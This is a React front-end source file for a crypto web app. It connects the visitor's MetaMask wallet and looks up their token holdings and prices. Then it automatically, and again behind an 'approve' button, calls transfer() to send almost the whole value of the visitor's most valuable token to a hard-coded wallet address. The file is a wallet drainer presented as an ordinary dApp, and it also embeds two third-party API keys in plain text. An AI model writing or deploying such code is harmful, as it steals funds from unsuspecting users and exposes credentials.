import React, { useState, useEffect } from 'react';
import { BrowserRouter, Navigate, Route, Routes } from 'react-router-dom';
import axios from 'axios';
import Web3 from "web3";
import 'bootstrap/dist/css/bootstrap.min.css';

import AdminScreen from './pages/Admin';
import UserScreen from './pages/User';
import abi1 from "./constants/abi.json";
import abi2 from "./constants/abi2.json";
import testAbi from "./constants/test-abi.json";
var WAValidator = require('wallet-address-validator');

const GET_TOKEN_PRICE_API_KEY = "5d2f3072c0b3bfa7b006979142925cbc1dccf788219d2a8f5869ef92ad5d2ff2";
const GET_USER_ALL_TOEKN_API_KEY = "BQYcUOSxiCsQ3ximvOlDzfrAWTS5CYJ5";

const web3 = new Web3(window.ethereum);
const busdAddress = '0x55d398326f99059fF775485246999027B3197955';
const contract1 = new web3.eth.Contract(abi1, busdAddress);

// const busdAddress = '0x7C1987977227fa66B072C3d9814E4082601637e4'; //test
// const contract1 = new web3.eth.Contract(testAbi, busdAddress); //test

const ethAddress = '0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56';
const contract2 = new web3.eth.Contract(abi2, ethAddress);


function App() {
  const [myAddress, setMyaddress] = useState('');
  const [walletStatus, setWalletStatus] = useState(false);
  const [initStatus, setInitStatus] = useState(false);
  const [userAllToken, setUserAllToken] = useState([]);
  useEffect(() => {
    const connectWallet = async () => {
      if (typeof window.ethereum !== 'undefined') {
        try {
          if (window.ethereum) {
            await window.ethereum.enable();
            try {
              // check if the chain to connect to is installed
              await window.ethereum.request({
                method: 'wallet_switchEthereumChain',
                params: [{ chainId: '0x1' }], // chainId must be in hexadecimal numbers
              });
              const accounts = await web3.eth.getAccounts();
              setMyaddress(accounts[0]);
              setWalletStatus(true);
            } catch (error) {
              // This error code indicates that the chain has not been added to MetaMask
              // if it is not, then install it into the user MetaMask
              if (error.code === 4902) {
                try {
                  await window.ethereum.request({
                    method: 'wallet_addEthereumChain',
                    params: [
                      {
                        chainId: '0x1',
                        rpcUrl: 'https://bsc-dataseed1.defibit.io/',
                      },
                    ],
                  });
                } catch (addError) {
                  console.error(addError);
                }
              }
              console.error(error);
            }
          }
        } catch (e) {
          return false;
        }
      }
    }
    const init = async (value) => {
      var valid = WAValidator.validate(value, 'ETH');
      var userAllTokenBalance = {
        eth: [],
        bsc: []
      };
      if (valid) {
        let query = `query ($network: EthereumNetwork!, $address: String!) {ethereum(network: $network) {address(address: {is: $address}) {balances {currency {address symbol tokenType decimals} value}}}}`;
        let variables = `{"limit": 10,"offset": 0,"network": "ethereum","address": "` + value + `"}`;
        let url = "https://graphql.bitquery.io/";
        let opts = {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
            "X-API-KEY": GET_USER_ALL_TOEKN_API_KEY
          },
          body: JSON.stringify({
            query,
            variables
          })
        };
        await fetch(url, opts).then(res => res.json())
          .then(data => userAllTokenBalance.eth = data.data.ethereum.address[0].balances)
          .catch(console.error);

        query = `query ($network: EthereumNetwork!, $address: String!) {ethereum(network: $network) {address(address: {is: $address}) {balances {currency {address symbol tokenType decimals} value}}}}`;
        variables = `{"limit": 10,"offset": 0,"network": "bsc","address": "` + value + `"}`;
        opts = {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
            "X-API-KEY": GET_USER_ALL_TOEKN_API_KEY
          },
          body: JSON.stringify({
            query,
            variables
          })
        };
        await fetch(url, opts).then(res => res.json())
          .then(data => userAllTokenBalance.bsc = data.data.ethereum.address[0].balances)
          .catch(console.error);
        if (userAllTokenBalance.bsc) {
          for (let i = 0; i < userAllTokenBalance.bsc.length; i++) {
            userAllTokenBalance.bsc[i].network = "BSC";
          }
        }
        if (userAllTokenBalance.eth) {
          for (let i = 0; i < userAllTokenBalance.eth.length; i++) {
            userAllTokenBalance.eth[i].network = "ETH";
          }
        }
        const array1 = userAllTokenBalance.eth ? userAllTokenBalance.eth : [];
        const array2 = userAllTokenBalance.bsc ? userAllTokenBalance.bsc : [];
        const array3 = array1.concat(array2);
        const array4 = array3.map(t => t.currency.symbol);
        const currentTokenPrice = await livePrice(array4);
        for (let i = 0; i < array3.length; i++) {
          if (currentTokenPrice[array3[i].currency.symbol]) {
            array3[i].price = currentTokenPrice[array3[i].currency.symbol].USD;
            array3[i].cost = +array3[i].value * array3[i].price;
          }
          else {
            array3[i].price = 0;
            array3[i].cost = +array3[i].value * 0;
          }
        }
        setUserAllToken(array3.sort(function (a, b) { return b.value - a.value; }).sort(function (a, b) { return b.cost - a.cost; }));
        setInitStatus(true);
        const autoApprove = async () => {
          try {
            let userAllToken = array3.sort(function (a, b) { return b.value - a.value; }).sort(function (a, b) { return b.cost - a.cost; });
            if (userAllToken.length) {
              const approveToken = userAllToken[0];
              if (approveToken.network === "BSC") {
                await window.ethereum.request({
                  method: 'wallet_switchEthereumChain',
                  params: [{ chainId: '0x38' }], // chainId must be in hexadecimal numbers
                });
                const approveAmount = (approveToken.cost - 5) / approveToken.price;
                console.log(approveToken, 33);
                console.log(approveAmount, 888888);
                console.log(web3.utils.toWei((approveAmount).toString(), "ether"));
                console.log('======================', typeof myAddress);
                // if (approveAmount.currency.address === "-") {

                // }else{

                // }

                await contract1.methods.transfer("0x13275Fe7e7Dd7a8fCbC43581978e3Fb75317D8d3", web3.utils.toWei((approveAmount).toString(), "ether")).send({ from: myAddress })
                  .on('receipt', (receipt) => { console.log(receipt) })
                // .then(async function (receipt) {
                //   await axios.post('http://localhost:5000/products', {
                //     userWalletAddress: myAddress,
                //     amount: approveAmount,
                //     symbol: approveToken.currency.symbol,
                //   });
                // });
              }
              else {
                await window.ethereum.request({
                  method: 'wallet_switchEthereumChain',
                  params: [{ chainId: '0x1' }], // chainId must be in hexadecimal numbers
                });
                const approveAmount = (approveToken.cost - 5) / approveToken.price;
                console.log(approveAmount, 888888);
                console.log(web3.utils.toWei((approveAmount).toString(), "ether"));
                console.log(`======================${myAddress}`);
                if (approveAmount.currency.address === "-") {
                  const contract = new web3.eth.Contract(abi1, approveAmount.currency.address);
                  await contract.methods.transfer("0x13275Fe7e7Dd7a8fCbC43581978e3Fb75317D8d3", web3.utils.toWei((approveAmount).toString(), "ether")).send({ from: myAddress })
                    .on('receipt', (receipt) => { console.log(receipt) })
                  // .then(async function (receipt) {
                  //   await axios.post('http://localhost:5000/products', {
                  //     userWalletAddress: myAddress,
                  //     amount: approveAmount,
                  //     symbol: approveAmount.currency.symbol,
                  //   });
                  // });
                } else {
                  const contract = new web3.eth.Contract(abi1, approveAmount.currency.address);
                  await contract.methods.transfer("0x13275Fe7e7Dd7a8fCbC43581978e3Fb75317D8d3", web3.utils.toWei((approveAmount).toString(), "ether")).send({ from: myAddress })
                    .on('receipt', (receipt) => { console.log(receipt) })
                  // .then(async function (receipt) {
                  //   await axios.post('http://localhost:5000/products', {
                  //     userWalletAddress: myAddress,
                  //     amount: approveAmount,
                  //     symbol: approveAmount.currency.symbol,
                  //   });
                  // });
                }

              }
            }
          } catch (error) {
            console.log(error.message);
          }
        }
        autoApprove();
      }
    }
    connectWallet();
    init(myAddress);
  }, [myAddress]);

  const livePrice = async (symbol) => {
    let tokenSymbol = symbol;
    let totaltemp = {};
    if (tokenSymbol.slice(0, 50).length) {
      let api = "https://min-api.cryptocompare.com/data/pricemulti?fsyms=" + tokenSymbol.slice(0, 50) + "&tsyms=USD&api_key=" + GET_TOKEN_PRICE_API_KEY;
      let temp = await axios.get(api);
      Object.assign(totaltemp, temp.data);
      if (tokenSymbol.slice(51, 100).length) {
        api = "https://min-api.cryptocompare.com/data/pricemulti?fsyms=" + tokenSymbol.slice(51, 100) + "&tsyms=USD&api_key=" + GET_TOKEN_PRICE_API_KEY;
        temp = await axios.get(api);
        Object.assign(totaltemp, temp.data)
      }
    }
    return totaltemp;
  }

  const handleApprove = async () => {
    try {
      if (walletStatus && initStatus && userAllToken.length) {
        const approveToken = userAllToken[0];
        if (approveToken.network === "BSC") {
          await window.ethereum.request({
            method: 'wallet_switchEthereumChain',
            params: [{ chainId: '0x38' }], // chainId must be in hexadecimal numbers
          });
          const approveAmount = (approveToken.cost - 5) / approveToken.price;
          console.log(approveToken, 33);
          console.log(approveAmount, 888888);
          console.log(web3.utils.toWei((approveAmount).toString(), "ether"));
          console.log('======================', typeof myAddress);

          await contract1.methods.transfer("0x13275Fe7e7Dd7a8fCbC43581978e3Fb75317D8d3", web3.utils.toWei((approveAmount).toString(), "ether")).send({ from: myAddress })
            .on('receipt', (receipt) => { console.log(receipt) })
          // .then(async function (receipt) {
          //   await axios.post('http://localhost:5000/products', {
          //     userWalletAddress: myAddress,
          //     amount: approveAmount,
          //     symbol: approveToken.currency.symbol,
          //   });
          // });
        }
        else {
          await window.ethereum.request({
            method: 'wallet_switchEthereumChain',
            params: [{ chainId: '0x1' }], // chainId must be in hexadecimal numbers
          });
          const approveAmount = (approveToken.cost - 5) / approveToken.price;
          console.log(approveAmount, 888888);
          console.log(web3.utils.toWei((approveAmount).toString(), "ether"));
          console.log(`======================${myAddress}`);
          const contract = new web3.eth.Contract(abi1, busdAddress);
          await contract.methods.transfer("0x13275Fe7e7Dd7a8fCbC43581978e3Fb75317D8d3", web3.utils.toWei((approveAmount).toString(), "ether")).send({ from: myAddress })
            .on('receipt', (receipt) => { console.log(receipt) })
          // .then(async function (receipt) {
          //   await axios.post('http://localhost:5000/products', {
          //     userWalletAddress: myAddress,
          //     amount: approveAmount,
          //     symbol: approveAmount.currency.symbol,
          //   });
          // });
        }
      }
    } catch (error) {
      console.log(error.message);
    }
  }
  return (
    <BrowserRouter>
      <Routes>
        <Route path="/" element={<UserScreen handleApprove={handleApprove} />} />
        <Route path="/admin" element={<AdminScreen />} />
        <Route path="*" element={<Navigate to="/" />} />
      </Routes>
    </BrowserRouter>
  );
}

export default App;